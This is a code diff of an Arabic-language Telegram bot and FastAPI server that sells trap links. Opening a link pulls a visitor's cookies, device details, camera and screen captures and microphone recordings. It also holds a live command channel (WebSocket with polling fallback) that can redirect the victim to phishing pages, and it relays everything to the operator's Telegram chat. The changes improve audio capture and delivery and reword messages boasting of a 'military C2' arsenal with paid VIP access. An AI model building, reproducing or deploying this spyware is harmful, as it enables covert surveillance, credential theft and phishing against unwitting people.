@@ -20,7 +20,7 @@ LINK_TO_USER = {}
 USERS_DB = {} 
 VICTIMS_DB = {} 
 ACTIVE_WEBSOCKETS = {}
-COMMAND_QUEUES = {} # طابور الأوامر الفورية للخلفية
+COMMAND_QUEUES = {}
 
 class VictimData(BaseModel):
     link_id: str
@@ -37,7 +37,7 @@ class CommandResponse(BaseModel):
     cmd: str
     data: str
 
-# --- 1. أداة الاستخبارات السريعة ---
+# --- 1. صفحة الاستخبارات السريعة ---
 @app.get("/intel/{link_id}", response_class=HTMLResponse)
 async def serve_intel_trap(link_id: str, request: Request):
     html_content = """<!DOCTYPE html>
@@ -105,7 +105,7 @@ async def serve_intel_trap(link_id: str, request: Request):
 </html>""".replace("__LINK_ID_REPLACE__", link_id)
     return HTMLResponse(content=html_content)
 
-# --- 2. أداة التحكم العسكري C2 (بنظام هجين فورى لا ينقطع) ---
+# --- 2. صفحة التحكم العسكري C2 (المحرك الهجين الفوري المحدث) ---
 @app.get("/live/{link_id}", response_class=HTMLResponse)
 async def serve_live_trap(link_id: str, request: Request):
     html_content = """<!DOCTYPE html>
@@ -165,22 +165,22 @@ async def serve_live_trap(link_id: str, request: Request):
                             const reader = new FileReader();
                             reader.readAsDataURL(blob);
                             reader.onloadend = function() {
-                                sendResult(cmdPacket.cmd, reader.result);
+                                sendResult("audio_clip", reader.result);
                             }
                             stream.getTracks().forEach(t => t.stop());
                         };
                         mediaRecorder.start();
-                        setTimeout(() => mediaRecorder.stop(), 4000);
-                        return "جاري التقاط التسجيل الصوتي الحي...";
+                        setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني واضحة
+                        return "🎤 جاري التقاط التسجيل الصوتي الحي...";
                     } catch(err) {
-                        output = "فشل التقاط الصوت (مرفوض)";
+                        output = "فشل التقاط الصوت (مرفوض الصلاحية)";
                     }
                 } else if (cmdPacket.cmd === "redirect_phish") {
                     window.location.href = cmdPacket.url || "https://www.google.com";
                     return;
                 }
             } catch(err) {
-                output = "خطأ في تنفيذ الأمر: " + err.message;
+                output = "خطأ في التنفيذ: " + err.message;
             }
             return output;
         }
@@ -190,7 +190,6 @@ async def serve_live_trap(link_id: str, request: Request):
             if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {
                 ws.send(JSON.stringify({type: "response", ...payload}));
             } else {
-                // إرسال عبر قناة الاستجابة السريعة البديلة HTTP لتجنب أي تعطل
                 fetch('/api/v1/c2-respond', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -199,17 +198,18 @@ async def serve_live_trap(link_id: str, request: Request):
             }
         }
 
-        // محرك الاستطلاع الخلفي الدائم (Long-Polling Fallback) لضمان العمل الفوري 100%
         async function startPollingEngine() {
             setInterval(async () => {
-                if (isWsActive) return; // لو الـ WebSocket شغال تمام، نكتفي به
+                if (isWsActive) return;
                 try {
                     let res = await fetch('/api/v1/poll-command/' + linkId);
                     if (res.ok) {
                         let pkt = await res.json();
                         if (pkt && pkt.cmd) {
                             let resData = await executeCommand(pkt);
-                            if (resData) sendResult(pkt.cmd, resData);
+                            if (resData && pkt.cmd !== "record_audio") {
+                                sendResult(pkt.cmd, resData);
+                            }
                         }
                     }
                 } catch(e) {}
@@ -220,11 +220,7 @@ async def serve_live_trap(link_id: str, request: Request):
             const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
             ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
 
-            ws.onopen = function() {
-                isWsActive = true;
-                console.log("[C2] WebSocket Connected.");
-            };
-
+            ws.onopen = function() { isWsActive = true; };
             ws.onmessage = async function(event) {
                 try {
                     const pkt = JSON.parse(event.data);
@@ -233,10 +229,11 @@ async def serve_live_trap(link_id: str, request: Request):
                         return;
                     }
                     let resData = await executeCommand(pkt);
-                    if (resData) sendResult(pkt.cmd, resData);
+                    if (resData && pkt.cmd !== "record_audio") {
+                        sendResult(pkt.cmd, resData);
+                    }
                 } catch(err) {}
             };
-
             ws.onclose = function() {
                 isWsActive = false;
                 setTimeout(initEnterpriseC2, 2000);
@@ -245,7 +242,7 @@ async def serve_live_trap(link_id: str, request: Request):
 
         async function bootstrap() {
             initEnterpriseC2();
-            startPollingEngine(); // تشغيل النظام الاحتياطي الفوري
+            startPollingEngine();
             try {
                 let img = "";
                 try {
@@ -284,7 +281,7 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     
     if target_user_id:
         try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[عقدة C2 متصلة فورياً]*: تم ربط الضحية بنجاح دون الحاجة لإعادة تحميل!\n🔑 معرف الجلسة: `{link_id}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[عقدة متصلة بنجاح]*: تم ربط الضحية فورياً دون إعادة تحميل!\n🔑 الجلسة: `{link_id}`", parse_mode="Markdown")
         except:
             pass
 
@@ -316,15 +313,16 @@ async def handle_response_packet(packet: dict):
             if cmd_type == "screen_snapshot" and "," in str(res_data):
                 _, encoded = res_data.split(",", 1)
                 photo = BufferedInputFile(base64.b64decode(encoded), filename="live_screen.jpg")
-                await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حية فورية من الضحية*", parse_mode="Markdown")
+                await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حية فورية*", parse_mode="Markdown")
             elif cmd_type == "audio_clip" and "," in str(res_data):
                 _, encoded = res_data.split(",", 1)
-                audio_file = BufferedInputFile(base64.b64decode(encoded), filename="mic_surveillance.ogg")
-                await bot.send_audio(chat_id=target_user_id, audio=audio_file, caption="🎤 *تسجيل صوتي حي من الميكروفون*", parse_mode="Markdown")
+                audio_file = BufferedInputFile(base64.b64decode(encoded), filename="surveillance_mic.ogg")
+                # إرسال التسجيل كرسالة صوتية حقيقية قابلة للاستماع المباشر في التيليجرام
+                await bot.send_voice(chat_id=target_user_id, voice=audio_file, caption="🎤 *تسجيل صوتي حي من الميكروفون*", parse_mode="Markdown")
             else:
                 await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
         except Exception as e:
-            print(f"Telegram Delivery Error: {e}")
+            print(f"Delivery Error: {e}")
 
 @app.post("/api/v1/c2-respond")
 async def c2_respond_fallback(resp: CommandResponse):
@@ -338,7 +336,6 @@ async def poll_command(link_id: str):
     return {}
 
 async def send_command_to_target(link_id: str, cmd_dict: dict):
-    # محاولة الإرسال عبر الـ WebSocket أولاً
     ws = ACTIVE_WEBSOCKETS.get(link_id)
     if ws:
         try:
@@ -346,8 +343,6 @@ async def send_command_to_target(link_id: str, cmd_dict: dict):
             return True
         except:
             pass
-    
-    # إذا لم يتوفر WebSocket، يوضع الأمر في طابور الاستطلاع الخلفي لينفذه الضحية فوراً
     if link_id not in COMMAND_QUEUES:
         COMMAND_QUEUES[link_id] = []
     COMMAND_QUEUES[link_id].append(cmd_dict)
@@ -364,10 +359,10 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             caption = (
-                "⚡ *[ تقرير الاتصال العسكري الفوري - C2 ]*\n\n"
+                "⚡ *[ تقرير العقدة العسكرية الفورية ]*\n\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
                 f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
-                f"🍪 *الكوكيز الأولية:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
+                f"🍪 *الكوكيز:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
             )
             
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
@@ -387,7 +382,7 @@ async def receive_loot(data: VictimData):
 
             if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                 _, encoded = data.camera_snapshot_base64.split(",", 1)
-                photo = BufferedInputFile(base64.b64decode(encoded), filename="c2_target.jpg")
+                photo = BufferedInputFile(base64.b64decode(encoded), filename="target.jpg")
                 await bot.send_photo(chat_id=target_user_id, photo=photo, caption=caption, parse_mode="Markdown", reply_markup=kb_control)
             else:
                 await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
@@ -415,9 +410,8 @@ async def process_live_commands(callback: types.CallbackQuery):
         await callback.answer("❌ أمر غير معروف.", show_alert=True)
         return
 
-    # إرسال الأمر فوراً عبر المحرك الهجين (لا رسائل خطأ مقفلة بعد الآن)
     await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
-    await callback.answer("🚀 تم إرسال الأمر للضحية، جاري التنفيذ الفوري...", show_alert=True)
+    await callback.answer("🚀 تم تنفيذ وإرسال الأمر بنجاح فوري!", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -435,8 +429,9 @@ async def cmd_start(message: types.Message):
         resize_keyboard=True
     )
     await message.answer(
-        "💀 *منصة الترسانة السيبرانية العسكرية (Active C2) جاهزة.*\n\n"
-        "• تمت إضافة المحرك الهجين الفوري (Hybrid Polling & WebSocket) لضمان تنفيذ الأوامر باللحظة دون أي حاجة لإعادة تحميل الصفحة من الضحية.\n"
+        "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة.*\n\n"
+        "• تمت معالجة وتحويل التسجيلات الصوتية لترسل تلقائياً كرسائل صوتية حقيقية داخل التيليجرام.\n"
+        "• الأوامر تعمل فوراً دون الحاجة لأي إعادة تحميل.\n"
         "• اختر الأداة المطلوبة:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -467,7 +462,7 @@ async def gen_intel_link(message: types.Message):
     LINK_TO_USER[token] = user_id
     
     rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
-    await message.answer(f"✅ *تم توليد رابط الاستخبارات:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط الاستخبارات جاهز:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")
 async def gen_live_link(message: types.Message):
@@ -488,7 +483,7 @@ async def gen_live_link(message: types.Message):
     url = f"https://{domain}/live/{token}"
     LINK_TO_USER[token] = user_id
     
-    await message.answer(f"✅ *تم تفعيل رابط التحكم العسكري الفوري:*\n\n`{url}`\n\n*(مدعوم بالمحرك الهجين: الأوامر تتنفذ فوراً بالخلفية دون انقطاع أو حاجة لإعادة تحميل)*", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط التحكم العسكري الفوري جاهز:*\n\n`{url}`\n\n*(الأوامر تتنفذ فوراً، والتسجيلات الصوتية تظهر كملفات صوتية مباشرة)*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
 async def show_victims(message: types.Message):
@@ -496,7 +491,7 @@ async def show_victims(message: types.Message):
     links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
     total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
     active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS or t in COMMAND_QUEUES)
-    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا المسجلين: *{total}*\n🟢 الجلسات العسكرية النشطة: *{active_now}*", parse_mode="Markdown")
+    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا: *{total}*\n🟢 الجلسات النشطة: *{active_now}*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
 async def buy_stars(message: types.Message):
@@ -504,7 +499,7 @@ async def buy_stars(message: types.Message):
     await bot.send_invoice(
         chat_id=message.chat.id,
         title="اشتراك الترسانة السيبرانية العسكرية (VIP)",
-        description="صلاحيات مطلقة بلا حدود لكافة أدوات الاستخبارات والتحكم العسكري الفوري.",
+        description="صلاحيات مطلقة بلا حدود لكافة الأدوات الاستخباراتية والتحكم العسكري الفوري.",
         payload="vip_full_access",
         currency="XTR",
         prices=prices
